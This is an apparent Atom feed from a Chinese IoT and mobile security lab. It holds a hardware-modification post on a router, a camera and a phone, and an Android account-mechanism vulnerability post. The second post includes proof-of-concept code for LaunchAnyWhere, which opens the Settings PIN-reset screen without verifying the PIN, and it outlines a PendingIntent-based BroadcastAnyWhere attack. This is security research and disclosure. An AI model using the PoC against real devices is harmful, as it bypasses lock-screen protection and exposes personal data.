<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>伏宸安全实验室-Future-Sec Information Security Lab</title>
  <subtitle>伏宸安全实验室Future-Sec Information Security Lab</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.future-sec.com/"/>
  <updated>2018-06-29T10:39:02.844Z</updated>
  <id>http://www.future-sec.com/</id>
  
  <author>
    <name>Future-Sec</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>物联网安全硬件修改系列-硬改</title>
    <link href="http://www.future-sec.com/iot-security-hardware-modification.html"/>
    <id>http://www.future-sec.com/iot-security-hardware-modification.html</id>
    <published>2018-06-26T16:00:00.000Z</published>
    <updated>2018-06-29T10:39:02.844Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>硬件层面的修改在现实生活中是相当常见的事情，所谓的硬改、魔改、硬破等等说法，指的就是在硬件层面对设备进行diy功能改造。例如针对传统路由器的硬件架构，替换大容量的内存和闪存芯片，使之能够刷openwrt系统；对某些设备进行配置层的升级，如iPhone，小米等手机内存扩容，使之具有更大容量的存储空间和运行内存； 以及对设备的破解，例如ps,xbox等游戏主机系列的硬破、软破，还有对各种加密录音笔，摄像头，加密U盘和硬盘的破解。<br>研究硬件修改对硬件diy改造，以及厂商在硬件层的安全防护具有非常重要意义。硬件层修改分为硬改和软改两个部分，硬改是对硬件中芯片和电路的改造、替换等，软改是针对芯片固件的修改、重打包等。本节将用具体的几个实例展示如何对设备进行硬改。</p>
<h2 id="硬改路由器刷openwrt"><a href="#硬改路由器刷openwrt" class="headerlink" title="硬改路由器刷openwrt"></a>硬改路由器刷openwrt</h2><h3 id="修改方案"><a href="#修改方案" class="headerlink" title="修改方案"></a>修改方案</h3><p>目前市面上主流的路由器，平时家用功能或许够用，但如果需要一些高级功能，比如屏蔽广告，挂vpn等等又难以实现，而采用openwrt系统可以充分满足定制化和diy的需求，openwrt是一个高度模块化、高度自动化的嵌入式Linux系统，拥有强大的网络组件和扩展性，但如果专门购买openwrt系统的路由器，价格却又不是十分亲民，如果能把传统路由器通过硬件修改，刷入openwrt系统，就是个低成本的解决方案了，本次用来硬改的路由器具体参数如下：品牌：TP-Link， 型号：WR842N，版本：v4.3，采用高通QCA9533的主控，16M的闪存、2M的flash芯片，虽然是老机器，但除了不能外接usb，基本满足需求，当然价格也便宜。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_150638.jpg" alt=""></p>
<p>不得不说TP-Link最近出的机器，硬件缩水越来越严重，新的机器，闪存都集成到了CPU里面，基本没有硬改的空间了。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180613_174407.jpg" alt=""></p>
<h3 id="更换内存芯片"><a href="#更换内存芯片" class="headerlink" title="更换内存芯片"></a>更换内存芯片</h3><p>openwrt系统最低硬件配置需要32M内存+8M存储芯片，因此需要更换机器上对应的两块芯片，下图红框部分。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_15063822.jpg" alt=""></p>
<p>首先更换内存芯片，换上64M内存芯片，新手的话，建议通过风枪来拆芯片，先用胶带保护一下芯片周围的元件，防止吹飞掉，加点助焊膏，温度稍微高一点。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_160529.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_152140.jpg" alt=""></p>
<p>芯片拆下后，先清洁一下焊盘，用吸锡线去掉焊盘上残余的锡，使焊盘平整，便于对齐芯片引脚。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_152132.jpg" alt=""></p>
<p>清洁完成后，换上64M芯片，注意芯片上的小圆点就是第一脚，需要跟焊盘上的右下角的小圆点对齐，方向不对，芯片就白焊了。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_154431.jpg" alt=""></p>
<p>对齐芯片后，先上一点锡，把芯片固定住，然后涂上助焊剂，为了防止引脚锡粘连，建议助焊膏多放一点，然后采用堆锡法，烙铁头采用弯头，便于拖动焊锡，温度稍高一点，一般无铅锡丝温度在380左右，否则焊锡拖不动，注意锡要适量，否则处理起来比较麻烦，用烙铁头的弯曲处沿着引脚朝一个方向拖动，可能会有剩余的锡处理不掉，可以用吸锡线处理。焊好一侧后，继续用同样的方式焊另一侧，全部焊接完成之后，让芯片自然冷却后，用洗板水或无水酒精清洗干净。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_153819.jpg" alt=""></p>
<p>先通电测试下路由器工作是否正常，如果亮灯不正常，就需要补焊一次。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_153823.jpg" alt=""></p>
<p>确认路由器工作正常，接下来拆下flash芯片，同样用风枪，拆下后，处理一下焊盘。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_160657.jpg" alt=""></p>
<h3 id="刷编程器固件"><a href="#刷编程器固件" class="headerlink" title="刷编程器固件"></a>刷编程器固件</h3><p>在恩山上下载了LEDE17.1的编程器固件，支持WR842N型号路由器，明月固件也可以，然后把bin文件通过编程器刷进芯片中。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_161309.jpg" alt=""></p>
<p>芯片放置在烧录座中，用烧录座连接编程器。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_154759.jpg" alt=""></p>
<p>编程器刷入固件。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606164128.png" alt=""></p>
<h3 id="更换闪存芯片"><a href="#更换闪存芯片" class="headerlink" title="更换闪存芯片"></a>更换闪存芯片</h3><p>把烧录完成后的芯片取出，然后焊接上，同样注意引脚的方向，芯片上的小圆点为第一脚，对准焊盘上的第一脚，加点助焊膏。<br>存储芯片引脚间距较大，用烙铁头粘上一点锡，采用点焊法即可焊上。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_171616.jpg" alt=""></p>
<h3 id="硬改完成"><a href="#硬改完成" class="headerlink" title="硬改完成"></a>硬改完成</h3><p>全部焊接完成，把板子清洁一下，重新通电测试，路由器正常，搜索到wifi信号后连接，后台地址：<a href="http://192.168.1.1/" rel="external nofollow noopener noreferrer" target="_blank">http://192.168.1.1/</a> 默认用户名和密码；root、root，登录进去，一切正常，说明硬改成功。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180613191402.jpg" alt=""></p>
<p>openwrt刷好后，需要先修改密码，然后开启一下ssh，就可以用ssh登录管理了，网上很多编译好的安装包，根据自己的需要安装。</p>
<h2 id="体外分离硬破摄像头"><a href="#体外分离硬破摄像头" class="headerlink" title="体外分离硬破摄像头"></a>体外分离硬破摄像头</h2><h3 id="修改方案-1"><a href="#修改方案-1" class="headerlink" title="修改方案"></a>修改方案</h3><p>在对某品牌智能摄像头进行串口调试时，发现厂商对串口进行了加密，需要输入root密码才能登陆系统。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180614141635.jpg" alt=""></p>
<p>尝试读取固件中的shadow文件，随即拆掉芯片进行固件读取，飞线读写的成功率不高。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180529_161328.jpg" alt=""></p>
<p>成功提取固件，找到密码，却暴力破解不了，可行的方案是修改密码然后重新打包固件在刷进芯片中了，改完密码后，重打包在刷进去。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180529_161037.jpg" alt=""></p>
<p>然而事情并不简单。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/sdfsdfsf5656.jpg" alt=""></p>
<p>固件修改重刷之后，通电测试发现摄像头并不能启动，排查问题根源在于固件重打包过程出了问题，内部可能也有校验，反复多次试验后，出现了意料之中的事情，因为摄像头较为廉价，PCB做工用料并不是十分优秀，反复拆焊导致焊盘损坏，芯片焊上去出现短路、断路等等问题，绝缘层脱落，采用飞线也无法解决，机器彻底报废，最终出现了如下尸横遍野的结果。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180614_115142.jpg" alt=""></p>
<h3 id="拆存储芯片"><a href="#拆存储芯片" class="headerlink" title="拆存储芯片"></a>拆存储芯片</h3><p>固件修改重刷是难以一次修改成功的，报废过多，造成太多的浪费，最终想到采用全部焊点飞线到烧录座上，在把芯片放在烧录座上，只要保证焊接不出错，飞线距离够短，就能保证焊盘不受损坏，固件也可以反复烧录测试。<br>首先拆掉芯片，周围同样采用胶带保护一下。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180529_161733.jpg" alt=""></p>
<h3 id="飞线芯片烧录座"><a href="#飞线芯片烧录座" class="headerlink" title="飞线芯片烧录座"></a>飞线芯片烧录座</h3><p>飞线采用很细的漆包铜线，线长控制在10厘米以内，刮去漆包线头的绝缘层，然后依次飞线焊接，注意焊盘和烧录座引脚的顺序。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180604_161048.jpg" alt=""></p>
<p>飞线完成后，用热熔胶固定好焊盘和飞线，防止焊点脱落。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180604_162135.jpg" alt=""></p>
<p>通电测试，发现机器一切正常，说明改造成功。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180604_163009.jpg" alt=""></p>
<h3 id="烧录固件"><a href="#烧录固件" class="headerlink" title="烧录固件"></a>烧录固件</h3><p>继续修改固件测试，修改的细节在之后固件修改章节会详细说明，<br>因为芯片放在烧录座上，可以轻易的取下重刷，极大的提高了效率，最终成功修改好密码，固件刷录，机器开启正常。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180614133847.jpg" alt=""></p>
<h3 id="硬破成功"><a href="#硬破成功" class="headerlink" title="硬破成功"></a>硬破成功</h3><p>用修改之后的密码成功登陆进行串口调试，继续更深层次的安全检测，此处调试接口RX、TX焊点已引出，方便接线。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/5b3265e34f0a9.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/5b3263dc9f57a.jpg" alt=""></p>
<h2 id="魔改小米5手机加6G内存"><a href="#魔改小米5手机加6G内存" class="headerlink" title="魔改小米5手机加6G内存"></a>魔改小米5手机加6G内存</h2><h3 id="修改方案-2"><a href="#修改方案-2" class="headerlink" title="修改方案"></a>修改方案</h3><p>小米手机一向以性价比著称，但其中的小米5作为2016年的旗舰机，却受到颇多的诟病，核心在于采用的是高通骁龙820的CPU，高配版的内存RAM都只有3G，导致手机运行中不是很流畅，鉴于内存过低，因此准备魔改成6G内存，本次更换的芯片为三星K3RG6G60MM-MGCJ-LPDDR4-6G内存芯片。</p>
<h3 id="拆机"><a href="#拆机" class="headerlink" title="拆机"></a>拆机</h3><p>说干就干，小米5的话，还是很好拆的一种机型，后盖可以直接打开，然后把螺丝、排线、电池一一取下，主板拿出来即可，注意电池因为背面贴有双面胶，一定不要用蛮力，否则可能损坏底部的排线和屏幕。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_193306.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_193313.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_193540.jpg" alt=""></p>
<p>主板取下后，没有被屏蔽罩保护的就是内存芯片，揭开散热垫，小米5自带的内存芯片型号为:海力士skhynix-H9HKNNNDGUMU-BRNMH-3Gbit-LPD4。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180606_193901.jpg" alt=""></p>
<h3 id="拆内存芯片"><a href="#拆内存芯片" class="headerlink" title="拆内存芯片"></a>拆内存芯片</h3><p>拆内存芯片要注意保护好周围元器件，贴上高温铝箔纸，涂上焊膏，风枪先给板子预热几秒，然后在距离芯片1厘米左右位置，沿着芯片四周按照同一个方向转动，使芯片均匀受热，防止爆板和爆片。<br>)<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_141602.jpg" alt=""></p>
<p>取下芯片后，清洁焊盘。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_143142.jpg" alt=""></p>
<h3 id="植锡球"><a href="#植锡球" class="headerlink" title="植锡球"></a>植锡球</h3><p>BGA焊接，植锡球是关键，植锡之前，必须把植锡网清洁干净，选用合适的锡球和BGA专用焊膏，先把芯片涂上一层焊膏，涂抹要均匀，注意不要过多，以植锡网覆盖上去后，焊膏不能溢出植锡网孔为准，否则会粘连锡球，选用0.25的无铅低温锡球，把芯片在植锡台上放好，然后盖上植锡网，要对准芯片的焊点，然后盖上固定盖。倒进锡球，稍微晃动一下，使锡球均匀的分布在网孔里，然后倒掉多余锡球，取下植锡网，在用热风枪加热植好锡球的芯片，使锡球固定，注意要缓慢移动风枪，风嘴距离芯片要稍远一点，防止锡球吹飞。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_144833.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_145204.jpg" alt=""></p>
<h3 id="BGA焊接"><a href="#BGA焊接" class="headerlink" title="BGA焊接"></a>BGA焊接</h3><p>先给焊盘均匀的上好一层焊膏，植好锡球的芯片，对准主焊盘，然后放置到BGA返修台上固定好，先100度预热烘干，在执行BGA焊接曲线。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_151437.jpg" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_151701.jpg" alt=""></p>
<p>焊接完成后，使板子自然冷却，然后清洗干净。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/20180607_154349.jpg" alt=""></p>
<h3 id="魔改完成"><a href="#魔改完成" class="headerlink" title="魔改完成"></a>魔改完成</h3><p>装机，然后开机测试，一切正常，说明魔改成功。</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/858ffghe3564/5b3263dc9f57e.jpg" alt=""></p>
<h2 id="《物联网安全百科》"><a href="#《物联网安全百科》" class="headerlink" title="《物联网安全百科》"></a>《物联网安全百科》</h2><p>伏宸安全实验室发起的开源图书《物联网安全百科》已经初步上线了，书中记录了实验室最新的一些研究成果和方向，以及物联网安全研究从基础到进阶的一些经验和知识，希望对有志于物联网安全研究者能起到一点的帮助，开源图书项目也希望能够得到大家的支持，一起参与去丰富内容，使之更加完善。<br><a href="https://iot-security.wiki" rel="external nofollow noopener noreferrer" target="_blank">图书阅读:</a> <a href="https://iot-security.wiki/" rel="external nofollow noopener noreferrer" target="_blank">https://iot-security.wiki/</a><br><a href="https://github.com/yaseng/iot-security-wiki" rel="external nofollow noopener noreferrer" target="_blank">项目地址:</a> <a href="https://github.com/yaseng/iot-security-wiki" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/yaseng/iot-security-wiki</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;硬件层面的修改在现实生活中是相当常见的事情，所谓的硬改、魔改、硬破等等说法，指的就是在硬件层面对设备进行diy功能改造。例如针对传统路由器的
    
    </summary>
    
      <category term="硬改" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E6%94%B9/"/>
    
    
      <category term="硬件分析" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    
      <category term="硬改" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E6%94%B9/"/>
    
  </entry>
  
  <entry>
    <title>Android账户机制漏洞专题</title>
    <link href="http://www.future-sec.com/android-account-manager-vulnerabilitys.html"/>
    <id>http://www.future-sec.com/android-account-manager-vulnerabilitys.html</id>
    <published>2018-06-24T16:00:00.000Z</published>
    <updated>2018-06-29T10:16:12.555Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Android 2.0中加入了一个新的包android.accounts，该包主要包括了集中式的账户管理API，用以安全地存储和访问认证的令牌和密码，比如，我们的手机存在多个账户，每个账户下面都有不同的信息，甚至每个账户都可以与不同的服务器之间进行数据同步（例如，手机账户中的联系人可以是一个Gmail账户中的通讯录，可联网进行同步更新）。通俗地讲，就是Android系统会开一个异步进程去帮我们登录（验证）账号，就不需要我们每次点开APP的时候还要走一遍登录（验证）账号的流程。我们根据这个机制，找到了三个可以利用的漏洞。</p>
<h2 id="账户机制介绍"><a href="#账户机制介绍" class="headerlink" title="账户机制介绍"></a>账户机制介绍</h2><p>我们先看一下账户机所运用到的API：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/20180629175412.jpg" alt=""></p>
<h3 id="创建账户："><a href="#创建账户：" class="headerlink" title="创建账户："></a>创建账户：</h3><p>首先是class Authenticator extends AbstractAccountAuthenticator ,如下图，该类是账号验证类 ，其中addAccount方法用来定义需要增加账号时的操作，如调用AuthenticatorActivity来进行账号的添加认证：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/1.jpg" alt=""></p>
<h3 id="同步账户："><a href="#同步账户：" class="headerlink" title="同步账户："></a>同步账户：</h3><p>SyncAdapter继承自AbstractThreadedSyncAdapter，SyncAdapter同样需要一个服务（Service）和一个同步适配器(AbstractThreadedSyncAdapter)。SyncAdapter的Service 需要在AndroidManifest里面声明一个带有Intent：android.content.SyncAdapter的Service来达到向系统注册一个具有同步功能的账户适配器(sync-adapter)。同步的方法主要在:<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/2.jpg" alt=""></p>
<p>在开发代码中用accountManager调用了addAccount方法后，就可以在android系统的 设置—&gt;账户 里面可以看到我们创建的账户:<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/3.png" alt=""></p>
<p>接下来点击Account账户中，可以找到立即同步的按钮，点击的话可以执行“立即同步”，就相当于执行了onPerformSync方法:<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/4.png" alt=""></p>
<p>下图为安卓系统添加账户的整体流程图：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/5.png" alt=""></p>
<h2 id="漏洞利用及复现"><a href="#漏洞利用及复现" class="headerlink" title="漏洞利用及复现"></a>漏洞利用及复现</h2><h3 id="Launch-Anywhere"><a href="#Launch-Anywhere" class="headerlink" title="Launch Anywhere"></a>Launch Anywhere</h3><p>AccountManagerService是系统服务之一，暴露给开发者的的接口是AccountManager。普通应用（记为AppA）去请求添加某类账户时，会调用AccountManager.addAccount,然后AccountManager会去查找提供账号的应用（记为AppB）的Authenticator类，调用Authenticator. addAccount方法；AppA再根据AppB返回的Intent去调起AppB的账户登录界面。这个过程如图所示：<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/6.png" alt=""></p>
<h4 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><p>这种设计的本意是，AccountManagerService帮助AppA查找到AppB账号登陆页面，并呼起这个登陆页面。而问题在于，AppB可以任意指定这个intent所指向的组件，AppA将在不知情的情况下由AccountManagerResponse调用起了一个Activity. 如果AppA是一个system权限应用，比如Settings，那么AppA能够调用起任意AppB指定的未导出Activity。</p>
<p>主要可以利用的代码：<br><figure class="highlight scala"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/** Handles the responses from the AccountManager */</span></div><div class="line"><span class="type">Private</span> <span class="class"><span class="keyword">class</span> <span class="title">Response</span> <span class="keyword">extends</span> <span class="title">IAccountManagerResponse</span>.<span class="title">Stub</span> </span>&#123;</div><div class="line">true<span class="type">Public</span> void onResult (<span class="type">Bundle</span> bundle) &#123;</div><div class="line">truetrue<span class="type">Intent</span> intent = bundle.getParcelable(<span class="type">KEY_INTENT</span>);</div><div class="line">truetrue<span class="type">If</span> (intent != <span class="literal">null</span> &amp;&amp; mActivity != <span class="literal">null</span>) &#123;</div><div class="line">truetrue  <span class="comment">// since the user provided an Activity we will silently start intents</span></div><div class="line">truetrue  <span class="comment">// that we see</span></div><div class="line">truetrue  mActivity.startActivity(intent);</div><div class="line">truetruetrue<span class="comment">// leave the Future running to wait for the real response to this request</span></div><div class="line">truetruetrue&#125; <span class="keyword">else</span> <span class="keyword">if</span> (bundle.getBoolean (<span class="string">"retry"</span>)) &#123;</div><div class="line">          ...</div></pre></td></tr></table></figure></p>
<h4 id="复现代码："><a href="#复现代码：" class="headerlink" title="复现代码："></a>复现代码：</h4><p>继承了AbstractAccountAuthenticator的类：<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">@Override</div><div class="line">public <span class="keyword">Bundle </span><span class="keyword">addAccount(AccountAuthenticatorResponse </span>response,</div><div class="line">                         String accountType, String authTokenType,</div><div class="line">                         String[] requiredFeatures, <span class="keyword">Bundle </span>options)</div><div class="line">        throws NetworkErrorException &#123;</div><div class="line">    Intent intent = new Intent()<span class="comment">;</span></div><div class="line">    intent.setComponent(new ComponentName(</div><div class="line">            <span class="string">"com.android.settings"</span>,</div><div class="line">            <span class="string">"com.android.settings.ChooseLockPassword"</span>))<span class="comment">;</span></div><div class="line">    intent.setAction(Intent.ACTION_RUN)<span class="comment">;</span></div><div class="line">    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)<span class="comment">;</span></div><div class="line">    intent.putExtra(<span class="string">"confirm_credentials"</span>,false)<span class="comment">;</span></div><div class="line">    final <span class="keyword">Bundle </span><span class="keyword">bundle </span>= new <span class="keyword">Bundle();</span></div><div class="line">    <span class="keyword">bundle.putParcelable(AccountManager.KEY_INTENT, </span>intent)<span class="comment">;</span></div><div class="line">    return <span class="keyword">bundle;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在继承了AbstractAccountAuthenticator的类中，我们重写了addAccount方法，配置一个可以打开修改pin码的系统级别的intent，然后再return 带有这个intent的bundle，系统得到这个bundle之后就会去启动这个intent，进而打开重置pin码的页面。</p>
<p>MainAcitivity类：<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">Intent intent1 = new Intent()<span class="comment">;</span></div><div class="line">intent1.setComponent(new ComponentName(</div><div class="line">        <span class="string">"com.android.settings"</span>,</div><div class="line">        <span class="string">"com.android.settings.accounts.AddAccountSettings"</span>))<span class="comment">;</span></div><div class="line">intent1.setAction(Intent.ACTION_RUN)<span class="comment">;</span></div><div class="line">intent1.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)<span class="comment">;</span></div><div class="line">String authTypes[] = &#123;TYPE &#125;<span class="comment">;</span></div><div class="line">intent1.putExtra(<span class="string">"account_types"</span>, authTypes)<span class="comment">;</span></div><div class="line">intent1.putExtra(<span class="string">"authTypes"</span>, authTypes)<span class="comment">;</span></div><div class="line">this.startActivity(intent1)<span class="comment">;</span></div></pre></td></tr></table></figure></p>
<p>这里我们只是在主类中启动了账户页面，并且进入创建账户的页面，从而触发AbstractAccountAuthenticator类中我们重写的addAccount方法，进入重置pin码的界面。</p>
<h4 id="复现截图："><a href="#复现截图：" class="headerlink" title="复现截图："></a>复现截图：</h4><ol>
<li><p>我们先设置初始pin码为123456，锁屏后需要输入123456来解锁手机。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/7.png" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/8.png" alt=""></p>
</li>
</ol>
<p>然后进入手机后，打开我们的APP，就能绕过pin码验证直接跳转到重置pin码界面。<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/9.png" alt=""></p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/10.png" alt=""></p>
<ol>
<li>我们也可以通过调用一些特殊应用的的用户资料界面，这种界面的exported属性一般是false，protectlevel属性signature，在这里也是可以直接导出，直接获取到其的个人敏感信息。（这里就不写相应的代码）<br><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/11.png" alt=""><h4 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h4>安卓4.4已经修复了这个漏洞，检查了Step3中返回的intent所指向的Activity和AppB是否是有相同签名的。避免了launch Anywhere的可能。修复代码如下：<figure class="highlight cos"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">If</span> (PackageManager.SIGNATURE_MATCH !=</div><div class="line">                        pm.checkSignatures(authenticatorUid, targetUid)) &#123;</div><div class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> SecurityException(</div><div class="line">                            <span class="string">"Activity to be started with KEY_INTENT must "</span> +</div><div class="line">                            <span class="string">"share Authenticator's signatures"</span>)<span class="comment">;</span></div><div class="line">                &#125;</div></pre></td></tr></table></figure>
</li>
</ol>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/12.png" alt=""></p>
<h3 id="Broadcast-Anyway"><a href="#Broadcast-Anyway" class="headerlink" title="Broadcast Anyway"></a>Broadcast Anyway</h3><p>继上面Android的LaunchAnyWhere组件安全漏洞后，最近Google在Android 5.0的源码上又修复了一个高危漏洞，该漏洞简直是LaunchAnyWhere的姊妹版——BroadcastAnyWhere。通过这个漏洞，攻击者可以以system用户的身份发送广播，这意味着攻击者可以无视一切的BroadcastReceiver组件访问限制。而且该漏洞影响范围极广，Android 2.0+至4.4.x都受影响。</p>
<h4 id="漏洞原理：-1"><a href="#漏洞原理：-1" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><p>BroadcastAnyWhere跟LaunchAnyWhere的利用原理非常类似，两者都利用了Setting的uid是system进程高权限操作。漏洞同样发生在Setting的添加账户的addAccount方法上。根据之前的addAccount方法中我们看到有个参数是Bundle类型的，参数名为options，该参数内部附带有添加用户用的额外信息，我们用代码展示一下内部的信息：</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/13.png" alt=""></p>
<p>可以看到，该额外参数告诉我们，执行添加账户的用户id是1000，也就是系统用户，有root权限，还有个参数是pendingIntent，该参数是主要是作为身份识别用的，也是具有系统权限的，我们攻击的切入点就是pendingIntent。</p>
<h4 id="pendingIntent介绍："><a href="#pendingIntent介绍：" class="headerlink" title="pendingIntent介绍："></a>pendingIntent介绍：</h4><p>PendingIntent对象可以按预先指定的动作进行触发，当这个对象传递（通过binder）到其他进程（不同uid的用户）,其他进程利用这个PendingIntent对象，可以原进程的身份权限执行指定的触发动作，这有点类似于Linux上suid或guid的效果。另外，由于触发的动作是由系统进程执行的，因此哪怕原进程已经不存在了，PendingIntent对象上的触发动作依然有效。</p>
<h4 id="攻击思路："><a href="#攻击思路：" class="headerlink" title="攻击思路："></a>攻击思路：</h4><p>PendingIntent提供了一个方法为send (Context context, int code, Intent intent, PendingIntent.OnFinished onFinished, Handler handler, String requiredPermission, Bundle options)，里面可以传一个参数为Intent intent，而在5.0的版本之前，我们可以对intent进行任意构造，然后通过pendingIntent发送出去。攻击思路如图：</p>
<p><img src="https://img-1253984064.cos.ap-guangzhou.myqcloud.com/78534yf39jsdjer/14.png" alt=""></p>
